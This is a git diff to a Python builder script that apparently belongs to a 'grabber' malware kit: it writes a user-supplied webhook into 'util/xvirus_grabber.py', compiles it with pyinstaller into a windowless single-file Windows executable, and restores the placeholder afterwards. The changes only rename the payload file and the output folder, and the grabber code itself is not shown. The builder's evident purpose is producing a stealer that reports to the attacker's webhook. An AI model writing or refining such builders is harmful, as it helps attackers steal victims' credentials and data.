@@ -16,13 +16,13 @@ def main():
     replace_text = webhook
  
     try:
-        with open(r'util/xvirus.py', 'r') as file:
+        with open(r'util/xvirus_grabber.py', 'r') as file:
 
             data = file.read()
 
             data = data.replace(search_text, replace_text)
 
-        with open(r'util/xvirus.py', 'w') as file:
+        with open(r'util/xvirus_grabber.py', 'w') as file:
 
             file.write(data)
 
@@ -44,7 +44,7 @@ def main():
     print("[*] Press CTRL + C to cancel, may break the application for future builds.")
     time.sleep(1.0)
 
-    os.system(f"pyinstaller --noconsole --onefile -n {file_name} -i assets/icons/exe.ico util/xvirus.py")
+    os.system(f"pyinstaller --noconsole --onefile -n {file_name} -i assets/icons/exe.ico util/xvirus_grabber.py")
     os.system("cls")
 
     global directory
@@ -62,7 +62,7 @@ def main():
 
     path = directory+"/build/"+file_name
     path2 = directory+f"{file_name}.spec"
-    dist = "/dist"
+    output = "/output"
 
     try:
         shutil.rmtree(f"{directory}/build")
@@ -74,13 +74,13 @@ def main():
     time.sleep(1.0)
 
     try:
-        with open(r'util/xvirus.py', 'r') as file:
+        with open(r'util/xvirus_grabber.py', 'r') as file:
 
             data = file.read()
 
             data = data.replace(replace_text, search_text)
 
-        with open(r'util/xvirus.py', 'w') as file:
+        with open(r'util/xvirus_grabber.py', 'w') as file:
 
             file.write(data)
 
@@ -91,12 +91,12 @@ def main():
         time.sleep(0.5)
 
     try:
-        path = directory + "/dist"
+        path = directory + "/output"
         path = os.path.realpath(path)
         os.startfile(path)
         print(f"[*] Opened the directory where {file_name}.exe is located.")
     except:
-        print(f"[!] Couldn't open the directory where {file_name}.exe is located. Maybe is has been deleted or wasn't built correctly. I would still recommend you to check the following directory for {file_name}.exe: '{directory} + {dist}'")
+        print(f"[!] Couldn't open the directory where {file_name}.exe is located. Maybe is has been deleted or wasn't built correctly. I would still recommend you to check the following directory for {file_name}.exe: '{directory} + {output}'")
 
     time.sleep(1.0)
 
